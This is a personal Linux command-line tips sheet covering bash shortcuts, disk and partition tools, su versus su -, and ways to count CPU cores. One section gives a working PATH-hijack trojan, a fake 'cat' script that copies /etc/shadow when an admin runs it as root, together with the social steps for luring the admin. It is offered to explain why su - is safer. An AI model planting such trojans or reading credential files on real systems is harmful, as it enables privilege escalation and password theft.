### Linux Tips and Tricks
### Navigating the command line

1. Ctrl+a move to beginning of line
2. Ctrl+e move to end of line
3. Ctrl+left arrow/ alt+b/ move back one word
4. Ctrl+right arrow/ alt+c move forward one word
5. Ctrl+k deletes text from cursor to end of line
6. Ctrl+x deletes text from cursor to beginning of line
7. Ctrl+d exits the bash shell



### Interrogate the system for drive partition and storage info
#### fdisk
This will show the partitions but also a bunch of the loops involved in device mounting and the output will be hard to read.

#### sfdisk
Similar output and can also display the size of paritions in mb

#### cfdisk (curses based)
Output will be similar to fdisk and sfdisk above but in a nice table format listing the: device(partition name)/ start sector/ end sector/ total sectors on the partition/ total partition size and filesystem type.
This outpt is clear, concise and immediately useful.

#### parted
Command line utility for partition manipulation. Beyond the scope of this tips document.

#### df
Disk Free. Outputs filesystem information, size of the partition, storage used/ storage available/ % used/ partition mounted on etc

#### pydf
Almost identical to df but more visually appealing. With colors.

#### lsblk
This command lists out all the storage blocks, which includes disk partitions and optical drives including the mount point and size of the drive. This command also shows the drives and partitions in a tree format much like the tree command,

#### blkid
Prints the block device (partitions and storage media) attributes like uuid and file system type. Does not report the space on the partitions.

#### hwinfo 
The hwinfo command is a general purpose hardware information tool and can be used to print out the disk and partition list. The output however does not print details about each partition like some of the other commands above.

# su - vs su
su - invokes a login shell after switching the user. A login shell resets most environment variables, providing a clean base.

su just switches the user, providing a normal shell with an environment nearly the same as with the old user.

# Beware of rogue developers
Something like this could happen:

Imagine, you're a software developer with normal user access to a machine and your ignorant admin just won't give you root access. Let's (hopefully) trick him.

$ mkdir /tmp/evil_bin
$ vi /tmp/evil_bin/cat
#!/bin/bash
test $UID != 0 && { echo "/bin/cat: Permission denied!"; exit 1; }
/bin/cat /etc/shadow &>/tmp/shadow_copy
/bin/cat "$@"
exit 0

$ chmod +x /tmp/evil_bin/cat
$ PATH="/tmp/evil_bin:$PATH"
Now, you ask your admin why you can't cat the dummy file in your home folder, it just won't work!

$ ls -l /home/you/dummy_file
-rw-r--r-- 1 you wheel 41 2011-02-07 13:00 dummy_file
$ cat /home/you/dummy_file
/bin/cat: Permission denied!
If your admin isn't that smart or just a bit lazy, he might come to your desk and try with his super-user powers:

$ su
Password: ...
cat /home/you/dummy_file
Some important dummy stuff in that file.
exit
Wow! Thanks, super admin!

$ ls -l /tmp/shadow_copy
-rw-r--r-- 1 root root 1093 2011-02-07 13:02 /tmp/shadow_copy
He, he.

You maybe noticed that the corrupted $PATH variable was not reset. This wouldn't have happened, if the admin invoked su - instead.


You can use one of the following command to find the number of physical CPU cores including all cores on Linux:
- lscpu command.
- cat /proc/cpuinfo.
- top or htop command.
- nproc command.
- hwinfo command.
- dmidecode -t processor command.
- getconf _NPROCESSORS_ONLN command.
